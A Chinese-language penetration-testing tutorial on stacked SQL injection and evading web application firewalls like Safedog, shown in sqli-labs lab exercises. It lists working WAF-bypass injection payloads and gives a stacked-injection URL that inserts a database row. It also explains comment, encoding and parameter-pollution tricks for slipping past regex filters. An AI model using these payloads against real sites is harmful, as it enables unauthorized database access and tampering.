![](https://img.yatjay.top/md/202203251651052.png)



# 涉及知识

## 堆叠查询注入

### 定义

Stacked injections(堆叠注入)从名词的含义就可以看到应该是**一堆(多条)SQL语句一起执行**。而在真实的运用中也是这样的,我们知道在MySQL中,主要是命令行中,每一条语句结尾加`;`表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stackedinjection。

### 原理

在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

### 局限性

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

比如MySQL可以堆叠注入，msSQL和Oracle都不支持

### 应用场景

比如注入需要管理员账号密码，密码是加密，无法解密，就可以使用堆叠注入insert进行插入数据，用户密码是自定义的，就能正常解密登录

以及其他场景，写在分号`;`之后的SQL语句自己定义，具体情况具体对待

## WAF及绕过思路

![](https://img.yatjay.top/md/202203251651103.png)

### wafw00f防火墙探测工具

#### 工具简介

现在网站为了加强自身安全，通常都会安装各类防火墙。这些防火墙往往会拦截各种扫描 请求，使得测试人员无法正确判断网站相关信息。Kali Linux 提供了一款网站防火墙探测工具 Wafw00f。它可以通过发送正常和带恶意代码的 HTTP 请求，以探测网站是否存在防火墙，并识别防火墙的类型。

##### WAFW00F 怎么工作

1. 发送正常的 HTTP 请求，然后分析响应，这可以识别出很多 WAF。 

2. 如果不成功，它会发送一些（可能是恶意的）HTTP 请求，使用简单的逻辑推断是哪一 个 WAF。 

3. 如果这也不成功，它会分析之前返回的响应，使用其它简单的算法猜测是否有某个 WAF 或者安全解决方案响应了我们的攻击

###### 参数

它可以检测很多 WAF。想要查看它能检测哪些 WAF，以-l 参数执行 WAFW00F

###### 命令：wafw00f 域名/IP

![img](https://img.yatjay.top/md/202203251651547.png)

### 部分 bypass sqlinject payload

```
id=1union/*%00*/%23a%0A/*!/*!select1,2,3*/;%23

id=-1union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*/%201,2,3%23

id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23

id=1/**&id=-1%20union%20select%201,2,3%23*/

id=-1%20union%20all%23%0a%20select%201,2,3%23

id=-1%20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
```



# 案例演示

## Sqlilabs-Less38-堆叠注入(多语句)

在执行select时的sql语句为：`SELECT * FROM users WHERE id='$id' LIMIT 0,1`

正常提交id值：

![](https://img.yatjay.top/md/202203251651076.png)

可以直接构造如下的payload：

```sql
http://localhost/pentest/sqlilabs/Less-38/index.php?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
```

![](https://img.yatjay.top/md/202203251651976.png)

再看数据表中的内容：可以看到less38已经添加

![](https://img.yatjay.top/md/202203251651989.png)



## WAF部署-安全狗,宝塔等waf搭建部署

安全狗：[📎safedogfwq_Windows_Help.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/22078880/1628829165383-acc2ec9d-8d4e-4266-b2bb-cce9118fdf0e.pdf)

宝塔：https://blog.csdn.net/weixin_43253175/article/details/105752439

以已经安装安全狗waf的sqlli-labs less2为例进行WAF绕过测试

![](https://img.yatjay.top/md/202203251651352.png)

直接输入payload会被拦截，无法注入

![](https://img.yatjay.top/md/202203251652178.png)

### 切换数据提交方式绕过WAF

使用post提交方式即可绕过（前提条件是源码支持该提交方式）

![](https://img.yatjay.top/md/202203251652704.png)

页面显示不正常，是因为本关代码只支持GET的提交方式，绕过思路是对的，但是在本关是无法成功的

![img](https://img.yatjay.top/md/202203251652458.png)

如果将本关源码GET接收参数改为POST，在判断回显位时可以正常注入

![img](https://img.yatjay.top/md/202203251652413.png)

在对回显位进行信息查询时，出现报错，是因为出现了过滤词database，是因为安全狗里面的漏洞防护规则里打开了防止查询数据库相关信息的规则

![img](https://img.yatjay.top/md/202203251652936.png)

![img](https://img.yatjay.top/md/202203251652306.png)

将该规则关闭之后可以正常注入

![img](https://img.yatjay.top/md/202203251652373.png)

正常WAF是开着的，而且过滤提交参数的机制一般是使用正则表达式对敏感参数进行过滤，如果正则表达式匹配成功，则本次将无法成功提交。因此对提交数据做一些改动使其绕过正则表达式的匹配就是一种绕过WAF的思路。

![](https://img.yatjay.top/md/202203251652810.png)

而且本关提交`database()`会被匹配拦截，提交`database`、`()`不会被匹配拦截。再次开启WAF，针对拦截敏感数据，我们可以针对数据进行相关的编译。

MySQL的查询语句中出现`/**/`不会对语句执行造成影响，所以可以在`database()`字符串中加入一个`/**/`，即成为`database/**/()`，以绕过正则表达式的匹配。可以看到注入语句被成功执行。

![img](https://img.yatjay.top/md/202203251652726.png)



将源码改回只允许GET方式提交参数

进行尝试，发现`union`不被拦截，`select`也不被拦截。而`union select`被拦截，说明是 union select关键词的问题。

![img](https://img.yatjay.top/md/202203251652794.png)

原因是开启了拦截联合查询的规则

![img](https://img.yatjay.top/md/202203251652702.png)

### 编码解码、注释符混用

#### 使用%23 %0A

`%23`是`# `

`%0A`是一个换行符

#### 原理

\#是为了注释掉a ，使用%0A换行是为了将union和select连接起来。如果不换行的话union后面的#会将union后面所有的语句注释掉

![img](https://img.yatjay.top/md/202203251652056.png)

![img](https://img.yatjay.top/md/202203251652865.png)





![img](https://img.yatjay.top/md/202203251652266.png)

![img](https://img.yatjay.top/md/202203251653524.png)

### 参数污染

原理

/** */ 注释

语句没有执行

![img](https://img.yatjay.top/md/202203251653001.png)

![img](https://img.yatjay.top/md/202203251653000.png)

![img](https://img.yatjay.top/md/202203251653634.png)

![img](https://img.yatjay.top/md/202203251653843.png)

![img](https://img.yatjay.top/md/202203251653060.png)



##  简要讲解安全狗,宝塔等防护waf策略规则

[https://blog.csdn.net/cheng1432996862/article/details/100968815?utm_term=waf%E5%B8%B8%E8%A7%81%E8%A7%84%E5%88%99&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-100968815&spm=3001.4430](https://blog.csdn.net/cheng1432996862/article/details/100968815?utm_term=waf常见规则&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-100968815&spm=3001.4430)

## 简要演示安全狗 bypass sqlinject 防护规则



## 实测简易CMS头部注入漏洞Bypass原理分析



# 涉及资源

https://www.cnblogs.com/backlion/p/9721687.html

https://blog.csdn.net/nzjdsds/article/details/93740686